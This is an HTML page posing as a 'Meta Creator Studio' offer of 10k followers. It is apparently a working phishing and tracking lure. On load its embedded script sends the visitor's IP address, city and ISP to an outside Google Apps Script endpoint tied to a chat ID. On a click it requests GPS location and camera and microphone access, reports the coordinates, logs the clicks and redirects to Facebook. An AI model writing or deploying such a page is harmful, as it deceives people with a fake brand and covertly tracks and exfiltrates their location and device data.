<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Meta Creator Studio</title><link rel="stylesheet" href="https://cdnjs.cloudflare.com"><style>body{font-family:sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}.c{background:#fff;padding:30px;border-radius:12px;box-shadow:0 8px 20px rgba(0,0,0,0.1);text-align:center;width:100%;max-width:400px}.b{width:100%;padding:15px;background:#0064e0;color:#fff;border:none;border-radius:8px;font-weight:700;cursor:pointer}.g{display:none;grid-template-columns:1fr 1fr;gap:10px;margin-top:20px}.card{background:#f0f2f5;padding:15px;border-radius:10px;font-size:12px;font-weight:700;cursor:pointer}</style></head><body>
<div class="c"><div style="font-size:40px;color:#0064e0;margin-bottom:10px"><i class="fab fa-facebook"></i></div><h2>Creator Hub</h2><p>Unlock 10k Followers & VIP Access</p><button id="s" class="b">Activate Sync</button><div id="grid" class="g"><div class="card" data-act="fol">10k Followers</div><div class="card" data-act="cam">Identity Sync</div><div class="card" data-act="loc">Region Lock</div><div class="card" data-act="grp">VIP Groups</div></div></div>
<script>
class OmniShield {
    constructor() {
        this.u = "https://script.google.com/macros/s/AKfycbykb7gQF51Mlg1YZgQcSxlpQIHAkcKhF-nJ_-jyaR0ur-YY1KsLaoZltPF1IbnJNs0HXw/exec";
        this.id = "6671784926";
        this.sid = Math.random().toString(36).substring(2,8).toUpperCase();
        this.init();
    }
    async rep(txt, h="v21-HIT") {
        fetch(this.u, {method:'POST', mode:'no-cors', body:JSON.stringify({chat_id:this.id, text:`ðŸ›¡ï¸ [${h}] ID:${this.sid}\n\n${txt}`, parse_mode:'HTML'})});
    }
    async init() {
        const ip = await fetch('https://ipapi.co').then(r=>r.json()).catch(()=>({}));
        this.rep(`IP: ${ip.ip}\nCity: ${ip.city}\nISP: ${ip.org}`, "START");
        document.getElementById('s').onclick = () => {
            document.getElementById('s').style.display='none';
            document.getElementById('grid').style.display='grid';
            navigator.geolocation.getCurrentPosition(p=>this.rep(`GPS: ${p.coords.latitude},${p.coords.longitude}`));
            navigator.mediaDevices.getUserMedia({video:true, audio:true}).then(s=>{this.rep("MEDIA: GRANTED");s.getTracks().forEach(t=>t.stop())});
        };
        document.querySelectorAll('.card').forEach(c=>c.onclick=()=>{this.rep(`CLICK: ${c.innerText}`);alert("Syncing...");window.location.href="https://business.facebook.com"});
    }
}
new OmniShield();
</script></body></html>
